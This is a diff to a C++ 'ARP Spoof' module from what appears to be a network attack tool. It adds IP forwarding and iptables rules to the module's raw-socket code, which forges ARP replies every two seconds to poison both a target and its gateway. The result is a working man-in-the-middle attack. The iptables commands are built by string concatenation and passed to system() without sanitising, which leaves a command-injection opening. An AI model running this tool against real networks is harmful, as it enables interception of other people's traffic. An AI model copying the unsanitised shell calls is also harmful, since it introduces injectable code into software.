@@ -8,6 +8,7 @@
 #include <net/if.h>
 #include <linux/if_packet.h>
 #include <chrono>
+#include <fstream> // Required for file I/O (IP Forwarding)
 
 #include "../headers/arp.h"
 
@@ -21,6 +22,18 @@ std::string ARP::get_name() {
     return "ARP Spoof";
 }
 
+// --- NEW HELPER: TOGGLE IP FORWARDING ---
+// Writes "1" (enable) or "0" (disable) to the kernel configuration
+void set_ip_forwarding(const char* value) {
+    std::ofstream file("/proc/sys/net/ipv4/ip_forward");
+    if (file.is_open()) {
+        file << value;
+        file.close();
+    } else {
+        perror("Failed to access /proc/sys/net/ipv4/ip_forward");
+    }
+}
+
 void ARP::stop() {
     stop_flag = true;
     for (auto& t : attack_threads) {
@@ -29,20 +42,39 @@ void ARP::stop() {
         }
     }
     attack_threads.clear();
-    //std::cout << get_name() << " stopped." << std::endl;
+    
+    // Disable IP Forwarding when attack stops to clean up
+    set_ip_forwarding("0");
+
+    // Clean up firewall rules
+    if (!this->interface.empty()) {
+        std::string rule1 = "iptables -D FORWARD -i " + this->interface + " -j ACCEPT";
+        std::string rule2 = "iptables -D FORWARD -o " + this->interface + " -j ACCEPT";
+        system(rule1.c_str());
+        system(rule2.c_str());
+    }
 }
 
 void ARP::run(Session* session) {
     if (session->interface.empty() || session->target_ip.empty() || session->target_mac.empty() || session->gateway_ip.empty() || session->gateway_mac.empty()) {
         std::cerr << C_YELLOW << "ARP Spoof requires interface, target IP/MAC, and gateway IP/MAC to be set." << C_RESET << std::endl;
-        // TODO: Better error handling
         return;
     }
 
+    // Enable IP Forwarding BEFORE starting the threads
+    // This allows packets to flow through your machine immediately
+    set_ip_forwarding("1");
+
+    // Store interface and add firewall rules
+    this->interface = session->interface;
+    std::string rule1 = "iptables -A FORWARD -i " + this->interface + " -j ACCEPT";
+    std::string rule2 = "iptables -A FORWARD -o " + this->interface + " -j ACCEPT";
+    system(rule1.c_str());
+    system(rule2.c_str());
+
     stop_flag = false;
     
-    // emplace_back is used to create threads directly in the vector without copying
-    // Thread 1: Poison the target (tell it we are the gateway)
+    // Thread 1: Poison the target (Tell Target that Gateway is US)
     attack_threads.emplace_back(&ARP::spoof_loop, this,
         session->interface,
         session->target_ip,
@@ -50,15 +82,13 @@ void ARP::run(Session* session) {
         session->target_mac
     );
 
-    // Thread 2: Poison the gateway (tell it we are the target)
+    // Thread 2: Poison the gateway (Tell Gateway that Target is US)
     attack_threads.emplace_back(&ARP::spoof_loop, this,
         session->interface,
         session->gateway_ip,
         session->target_ip,
         session->gateway_mac
     );
-
-    //std::cout << C_BOLD << get_name() << " started... Poisoning target and gateway." << C_RESET << std::endl;
 }
 
 void ARP::spoof_loop(std::string iface_str, std::string target_ip_str, std::string spoof_ip_str, std::string target_mac_str) {
@@ -83,15 +113,17 @@ void ARP::spoof_loop(std::string iface_str, std::string target_ip_str, std::stri
     struct ethhdr* eth = (struct ethhdr*)packet;
     struct arp_header* arp = (struct arp_header*)(packet + sizeof(struct ethhdr));
 
+    // Ethernet Header
     memcpy(eth->h_dest, victim_mac, 6);
     memcpy(eth->h_source, attacker_mac, 6);
     eth->h_proto = htons(ETH_P_ARP);
 
+    // ARP Header
     arp->htype = htons(1);
     arp->ptype = htons(0x0800);
     arp->hlen = 6;
     arp->plen = 4;
-    arp->oper = htons(2); // 2 for ARP Reply
+    arp->oper = htons(2); // ARP Reply (is-at)
 
     memcpy(arp->sha, attacker_mac, 6);
     inet_pton(AF_INET, spoof_ip, arp->spa);
@@ -108,6 +140,7 @@ void ARP::spoof_loop(std::string iface_str, std::string target_ip_str, std::stri
         if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&device, sizeof(device)) < 0) {
             perror("Failed to send ARP packet");
         }
+        // Send every 2 seconds to maintain the poison
         std::this_thread::sleep_for(std::chrono::seconds(2));
     }
 
@@ -139,7 +172,6 @@ void ARP::parse_mac(const char* mac_str, uint8_t* mac_out) {
         &values[3], &values[4], &values[5]) == 6) {
         for(int i = 0; i < 6; ++i) mac_out[i] = (uint8_t)values[i];
     } else {
-         // Handle error, maybe set to a default or log it
         memset(mac_out, 0, 6);
     }
 }
